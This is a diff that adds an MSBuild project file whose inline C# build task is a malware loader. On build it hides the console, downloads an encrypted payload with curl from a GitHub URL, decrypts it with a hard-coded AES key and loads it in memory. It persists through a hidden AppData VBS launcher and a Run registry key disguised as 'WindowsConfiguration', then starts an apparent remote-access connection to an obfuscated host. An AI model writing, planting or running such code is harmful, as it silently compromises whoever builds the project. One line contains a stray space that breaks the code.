@@ -1,0 +1,130 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Build">
+    <ClassTask/>
+  </Target>
+  <UsingTask TaskName="ClassTask" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Core"/>
+      <Using Namespace="System"/>
+      <Using Namespace="System.IO"/>
+      <Using Namespace="System.Security.Cryptography"/>
+      <Using Namespace="System.Reflection"/>
+      <Using Namespace="System.Threading"/>
+      <Using Namespace="System.Runtime.InteropServices"/>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.IO;
+        using System.Security.Cryptography;
+        using System.Reflection;
+        using System.Threading;
+        using System.Runtime.InteropServices;
+        using System.Diagnostics;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class ClassTask : Task
+        {
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetConsoleWindow();
+
+            [DllImport("user32.dll")]
+            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+            public override bool Execute()
+            {
+                try
+                {
+                    ShowWindow(GetConsoleWindow(), 0);
+
+                    string tmp = Path.Combine(Path.GetTempPath(), "b.bin");
+                    var dl = new Process();
+                    dl.StartInfo.FileName = "curl.exe";
+                    dl.StartInfo.Arguments = "-sL -o \"" + tmp + "\" \"https://raw.githubusercontent.com/aes256encrypt/testlol/main/payload.bin\"";
+                    dl.StartInfo.UseShellExecute = false;
+                    dl.StartInfo.CreateNoWindow = true;
+                    dl.Start();
+                    dl.WaitForExit();
+                    byte[] enc = File.ReadAllBytes(tmp);
+                    File.Delete(tmp);
+
+                    byte[] key = Convert.FromBase64String("S29yYSFTZWNyZXRLZXlGb3JFeGZpbERhdGFQYWNrIQA=");
+                    byte[] iv = Convert.FromBase64String("3q2+78r+ur4TN0JC/u36zg==");
+
+                    byte[] dec;
+                    using (var aes = Aes.Create())
+                    {
+                        aes.Mode = CipherMode.CBC;
+                        aes.Padding = PaddingMode.PKCS7;
+                        aes.KeySize = 256;
+                        aes.Key = key;
+                        aes.IV = iv;
+                        using (var ms = new MemoryStream())
+                        using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
+                        {
+                            cs.Write(enc, 0, enc.Length);
+                            cs.FlushFinalBlock();
+                            dec = ms.ToArray();
+                        }
+                    }
+
+                    Assembly asm = Assembly.Load(dec);
+
+                    // Persistence: drop the XML cradle and register silent startup via registry
+                    try
+                    {
+                        string persistDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Services");
+                        string persistXml = Path.Combine(persistDir, "config.xml");
+                        string persistVbs = Path.Combine(persistDir, "start.vbs");
+                        Directory.CreateDirectory(persistDir);
+                        string selfXml = Path.Combine(Path.GetTempPath(), "b.xml");
+                        if (!File.Exists(persistXml))
+                        {
+                            if (File.Exists(selfXml))
+                                File.Copy(selfXml, persistXml, true);
+                            else
+                            {
+                                var dlXml = new Process();
+                                dlXml.StartInfo.FileName = "curl.exe";
+                                dlXml.StartInfo.Arguments = "-sL -o \"" + persistXml + "\" \"https://raw.githubusercontent.com/aes256encrypt/testlol/main/b.xml\"";
+                                dlXml.StartInfo.UseShellExecute = false;
+                                dlXml.StartInfo.CreateNoWindow = true;
+                                dlXml.Start();
+                                dlXml.WaitForExit(10000);
+                            }
+                        }
+                        string msbuild = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe";
+                        string vbsContent = "CreateObject(\"WScript.Shell\").Run \"\"\"" + msbuild + "\"\" \"\"" + persistXml + "\"\" /nologo /v:q\", 0, False";
+                        File.WriteAllText(persistVbs, vbsContent);
+                        try { File.SetAttributes(persistDir, FileAttributes.Hidden); } catch { }
+                        Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                        if (rk != null) { rk.SetValue("WindowsConfiguration", "wscript.exe \"" + persistVbs + "\""); rk.Close(); }
+                    }
+                    catch { }
+
+                    // Clean up temp xml after persistence is set
+                    try { File.Delete(Path.Combine(Path.GetTempPath(), "b.xml")); } catch { }
+
+                    Type sType = asm.GetType("AppServices.S");
+                    var dMethod = sType.GetMethod("D", BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public);
+                    string host = (string)dMethod.Invoke(null, new object[] { "TkdHUUxLUU5MSVFNTEY=" });
+                    int port = 0xDEAD ^ 0xD166;
+
+                    Type shType = asm.Ge tType("AppServices.ServiceHost");
+                    var initMethod = shType.GetMethod("Initialize", BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public);
+
+                    var t = new Thread(() => { try { initMethod.Invoke(null, new object[] { host, port }); } catch { } });
+                    t.SetApartmentState(ApartmentState.STA);
+                    t.IsBackground = false;
+                    t.Start();
+                    Thread.Sleep(Timeout.Infinite);
+                }
+                catch { }
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
